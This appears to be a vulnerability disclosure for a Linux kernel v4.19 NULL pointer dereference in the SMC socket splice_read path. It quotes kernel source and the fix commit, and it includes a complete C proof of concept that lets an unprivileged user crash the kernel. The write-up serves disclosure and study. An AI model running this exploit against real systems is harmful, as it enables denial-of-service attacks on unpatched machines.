# description
In linux kernel v4.19, a carefully crafted PoC allows a regular user to trigger a kernel NULL pointer dereference. The triggering process is as follows:

```c
static ssize_t smc_splice_read(struct socket *sock, loff_t *ppos,
                               struct pipe_inode_info *pipe, size_t len,
                               unsigned int flags)
{
        struct sock *sk = sock->sk;
        struct smc_sock *smc;
        int rc = -ENOTCONN;

        smc = smc_sk(sk);
        lock_sock(sk);

        if (sk->sk_state == SMC_INIT ||
            sk->sk_state == SMC_LISTEN ||
            sk->sk_state == SMC_CLOSED)
                goto out;

        if (sk->sk_state == SMC_PEERFINCLOSEWAIT) {
                rc = 0;
                goto out;
        }

        if (smc->use_fallback) {
                rc = smc->clcsock->ops->splice_read(smc->clcsock, ppos,
                                                    pipe, len, flags);
        // ...
```

smc->clcsock->ops->splice_read calls the tcp_splice_read function,

```c
ssize_t tcp_splice_read(struct socket *sock, loff_t *ppos,
                        struct pipe_inode_info *pipe, size_t len,
                        unsigned int flags)
{
        // ...
        timeo = sock_rcvtimeo(sk, sock->file->f_flags & O_NONBLOCK);
        // ...
```

but at this point, sock->file is NULL.



# Fix commit

v5.1-rc4-74-g07603b230895

```
commit 07603b230895a74ebb1e2a1231ac45c29c2a8cd3
Author: Ursula Braun <ubraun@linux.ibm.com>
Date:   Thu Apr 11 11:17:32 2019 +0200

    net/smc: propagate file from SMC to TCP socket
    
    fcntl(fd, F_SETOWN, getpid()) selects the recipient of SIGURG signals
    that are delivered when out-of-band data arrives on socket fd.
    If an SMC socket program makes use of such an fcntl() call, it fails
    in case of fallback to TCP-mode. In case of fallback the traffic is
    processed with the internal TCP socket. Propagating field "file" from the
    SMC socket to the internal TCP socket fixes the issue.
    
    Reviewed-by: Karsten Graul <kgraul@linux.ibm.com>
    Signed-off-by: Ursula Braun <ubraun@linux.ibm.com>
    Signed-off-by: David S. Miller <davem@davemloft.net>

```

It change the SMC with TCP, smc->clcsock->ops->splice_read will not call the tcp_splice_read function,


# poc

```c 
#include <stdio.h>
#include <netinet/in.h>
#include <sys/syscall.h>
#include <unistd.h>
void poc(void)
{
    int pipefd[2];
    int r=0;
    int smc_sock_fd=socket(AF_SMC,1,0);
    if (smc_sock_fd==-1){
        puts("The SMC kernel module is not loaded. Please load it first.");
        return ;
    }
    struct sockaddr_in server_addr={0};
    server_addr.sin_family=AF_INET;
    server_addr.sin_port=htons(6666);
    r=syscall(__NR_bind,smc_sock_fd,&server_addr,0x10);
    if (r==-1)
    {
        puts("The port is occupied, please switch to another port.");
        return;
    }
    r=syscall(__NR_connect,smc_sock_fd,&server_addr,0x10);
    if (r==-1)
    {
        puts("Connect error, kernel code changed. :(");
        return;
    }
    puts("Now, you can check the log by dmesg. :)");
    syscall(__NR_pipe,pipefd);
    syscall(__NR_splice,smc_sock_fd,0,pipefd[1],0,4,8);
}
int main()
{
    poc();
}
```
